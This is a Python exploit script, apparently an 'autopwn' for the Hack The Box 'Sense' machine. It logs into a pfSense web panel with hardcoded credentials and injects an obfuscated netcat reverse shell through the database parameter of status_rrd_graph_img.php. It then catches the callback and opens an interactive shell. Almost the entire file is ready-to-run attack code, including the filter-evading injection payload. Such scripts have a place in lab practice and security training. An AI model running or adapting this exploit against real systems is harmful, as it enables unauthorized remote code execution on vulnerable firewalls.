#!/usr/bin/python3
#coding:utf-8

import sys, threading, time, argparse, requests, signal, urllib3, re
from pwn import *

def def_handler(sig, frame):
    print("\n[!] Saliendo...")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "https://10.10.10.60/index.php"
reverse_url = "https://10.10.10.60/status_rrd_graph_img.php?database=queues;"
lhost = ""
lport = "443"

def makeRequest():
    s = None
    try:
        urllib3.disable_warnings()
        s = requests.session()
        s.verify = False
        s.keep_alive = False
        r = s.get(main_url)
        csrf_magic = re.findall(r'__csrf_magic\' value="(.*?)"',r.text)[0]
        login_data = {
            '__csrf_magic' : '%s' % (csrf_magic),
            'usernamefld' : 'rohit',
            'passwordfld' : 'pfsense',
            'login' : 'Login'
        }
        p1 = log.progress("Login")
        p1.status("Ingresando datos al panel de login")
        time.sleep(2)
        r = s.post(main_url, data=login_data)
        p1.success("Ingresando exitosamente")
        time.sleep(2)
        p2 = log.progress("RCE")
        p2. status("Inyectando comando para reverse shell")
        time.sleep(2)
        reverse_shell = reverse_url + "guion=$(printf+'\\055');amper=$(printf+'\\046');rm+${HOME}tmp${HOME}f;mkfifo+${HOME}tmp${HOME}f;cat+${HOME}tmp${HOME}f|${HOME}bin${HOME}sh+${guion}i+2>${amper}1|nc+%s+%s+>${HOME}tmp${HOME}f" % (lhost,lport)
        r = s.get(reverse_shell, timeout=2)
    except requests.exceptions.Timeout:
        p2.success("Comando inyectado exitosamente")
        time.sleep(2)
    except:
        print("\n[*] Ha ocurrido un error...")
        sys.exit(1)

if __name__ == '__main__':
    argparser = argparse.ArgumentParser(description='Autopwn de la máquina Sense de la plataforma HTB')
    argparser.add_argument('--rhost', type=str,
            help='Remote host ip (default: 10.10.10.60)',
            default='10.10.10.60')
    argparser.add_argument('--lhost', type=str,
            help='Local host ip (Attacker)',
            required=True)
    argparser.add_argument('--lport', type=str,
            help='Local port (default: 443)',
            default='443')
    args = argparser.parse_args()

    rhost = args.rhost
    lport = args.lport
    lhost = args.lhost

    try:
        threading.Thread(target=makeRequest).start()
    except Exception as e:
        log.error(str(e))
        sys.exit(1)
    
    p3 = log.progress("Conexión")
    p3.status("En espera de una conexión")
    time.sleep(2)
    shell = listen(lport, timeout=20).wait_for_connection()
    if shell.sock is None:
        p3.failure("Conexión no recibida")
        time.sleep(2)
        sys.exit(1)
    else:
        p3.success("Se ha recibido una conexión")
        time.sleep(2)

    shell.interactive()
